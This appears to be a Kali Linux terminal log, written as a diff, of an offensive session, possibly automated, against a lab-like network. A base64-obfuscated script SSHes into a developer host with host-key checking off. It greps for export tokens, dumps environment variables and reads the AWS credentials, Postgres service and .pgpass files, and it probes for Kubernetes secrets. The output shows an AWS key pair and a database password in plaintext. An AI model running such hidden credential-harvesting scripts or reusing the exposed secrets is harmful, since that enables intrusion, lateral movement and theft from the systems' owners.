@@ -1,0 +1,72 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r5.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKc2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD0xMCByb3dhbi1kZXYgJ2Jhc2ggLXMnIDw8J1JTSCcKc2V0ICtlCmVjaG8gIiMjIyMjIyBncmVwIGV4cG9ydF90b2tlbiAvIGV4cG9ydCByb2xlIGV2ZXJ5d2hlcmUgcmVhZGFibGUiCmdyZXAgLXJJbCAtaUUgJ2V4cG9ydFtfIC1dP3Rva2VufGV4cG9ydFtfIC1dP3JvbGV8WC1FeHBvcnR8c2NoZWR1bGVzL3xTQ0hFRC0nIC9ob21lL3Jvd2FuIC9vcHQgL3NydiAvZXRjIC91c3IvbG9jYWwgMj4vZGV2L251bGwgfCBncmVwIC12IC1FICdcLmNhY2hlfFwua3ViZS9jYWNoZXxub2RlX21vZHVsZXMnIHwgaGVhZCAtNDAKZWNobyAiIyMjIyMjIGdyZXAgc2NoZWR1bGUgaW4gaG9tZSIKZ3JlcCAtckluIC1pRSAnZXhwb3J0W18gLV0/dG9rZW58ZXhwb3J0X3JvbGV8WC1FeHBvcnR8U0NIRUQtMjg0MXxzY2hlZHVsZScgL2hvbWUvcm93YW4vd29yayAvaG9tZS9yb3dhbi9yZXBvcyAvaG9tZS9yb3dhbi9SRUFETUUubWQgL2hvbWUvcm93YW4vazA1YXJjaCAvb3B0L2ZpZWxka2VzdC13b3JrYmVuY2ggMj4vZGV2L251bGwgfCBoZWFkIC00MAplY2hvICIjIyMjIyMgd29ya2JlbmNoIGRpciIKbHMgLWxhIC9vcHQvZmllbGRrZXN0LXdvcmtiZW5jaCAyPiYxCmVjaG8gIiMjIyMjIyBlbnYiCmVudiB8IHNvcnQgfCBoZWFkIC00MAplY2hvICIjIyMjIyMgYXdzIGNyZWRzIgpjYXQgfi8uYXdzL2NvbmZpZyB+Ly5hd3MvY3JlZGVudGlhbHMgMj4mMQplY2hvICIjIyMjIyMgcGcgc2VydmljZSIKY2F0IH4vLnBnX3NlcnZpY2UuY29uZiB+Ly5wZ3Bhc3MgMj4mMQplY2hvICIjIyMjIyMgZG9ja2VyL2s4cyBydW50aW1lPyIKbHMgLWxhIC92YXIvcnVuL3NlY3JldHMva3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudCAyPiYxCm1vdW50IDI+L2Rldi9udWxsIHwgaGVhZCAtMjAKUlNICmVjaG8gRE9ORV9SNQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r5.sh; bash /tmp/r5.sh; echo DONEMARK_1795200185847$((6*7))
+###### grep export_token / export role everywhere readable
+###### grep schedule in home
+/home/rowan/repos/policy-compiler/policy-compiler/maps/fieldkest-policyc-2.6.4.map:770:                              /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(tpp.o) (__sched_getscheduler)
+/home/rowan/repos/policy-compiler/policy-compiler/maps/fieldkest-policyc-2.6.4.map:776:                              /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(tpp.o) (__sched_setscheduler)
+/home/rowan/repos/policy-compiler/policy-compiler/maps/fieldkest-policyc-2.6.4.map:24409:                0x0000000000530dc0                sched_getscheduler
+/home/rowan/repos/policy-compiler/policy-compiler/maps/fieldkest-policyc-2.6.4.map:24410:                0x0000000000530dc0                __sched_getscheduler
+/home/rowan/repos/policy-compiler/policy-compiler/maps/fieldkest-policyc-2.6.4.map:24421:                0x0000000000530e50                __sched_setscheduler
+/home/rowan/repos/policy-compiler/policy-compiler/maps/fieldkest-policyc-2.6.4.map:24422:                0x0000000000530e50                sched_setscheduler
+###### workbench dir
+ls: cannot open directory '/opt/fieldkest-workbench': Permission denied
+###### env
+HOME=/home/rowan
+LOGNAME=rowan
+MAIL=/var/mail/rowan
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/games
+PWD=/home/rowan
+SHELL=/bin/bash
+SHLVL=1
+SSH_CLIENT=10.50.13.181 53462 22
+SSH_CONNECTION=10.50.13.181 53462 10.77.55.2 22
+USER=rowan
+_=/usr/bin/env
+###### aws creds
+[default]
+region=us-east-1
+ca_bundle=/home/rowan/.local/share/keplerops/ca.crt
+s3=
+    addressing_style=path
+[default]
+aws_access_key_id=GAX0wNnSB1w04RwfLLBvbme_ZhdMYSqbZqFpTuPmD5o
+aws_secret_access_key=7YOhGW15uzY1crdHT3PIrR2FVzbxaqgQ6mm51oYOVlE
+###### pg service
+[fieldlink]
+host=data.keplerops.test
+port=5432
+dbname=fieldlink_data
+user=rowan_data
+sslmode=verify-full
+sslrootcert=/home/rowan/.local/share/keplerops/ca.crt
+data.keplerops.test:5432:fieldlink_data:rowan_data:lobf9Jt0SBW433in6wUVlkixnQreh5K-Z1LjbTofrqY
+###### docker/k8s runtime?
+ls: cannot access '/var/run/secrets/kubernetes.io/serviceaccount': No such file or directory
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/20059/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19912/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19911/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19910/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19909/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19908/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19907/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19906/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19905/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19904/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19903/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19902/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19901/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19900/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19899/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19898/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19897/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19896/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19895/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19894/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19893/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19892/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19891/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19890/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19889/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19888/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19887/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/62/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/49/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/47/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/41/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/20060/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/20060/work)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
+cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=16384k,mode=755,inode64)
+tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+/dev/sda1 on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
+/dev/sda1 on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
+/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
+/dev/sda1 on /home/rowan type ext4 (rw,relatime,discard,errors=remount-ro)
+tmpfs on /var/log type tmpfs (rw,nosuid,nodev,noexec,relatime,size=32768k,mode=755,inode64)
+/dev/sda1 on /run/fieldkest-auth/ca.crt type ext4 (ro,relatime,discard,errors=remount-ro)
+/dev/sda1 on /run/fieldkest-auth/enrollment-ca.crt type ext4 (ro,relatime,discard,errors=remount-ro)
+/dev/sda1 on /run/fieldkest-auth/foothold_authorized_keys type ext4 (ro,relatime,discard,errors=remount-ro)
+/dev/sda1 on /run/fieldkest-auth/rowan_authorized_keys type ext4 (ro,relatime,discard,errors=remount-ro)
+/dev/sda1 on /var/lib/fieldkest-workbench/audit type ext4 (rw,relatime,discard,errors=remount-ro)
+DONE_R5
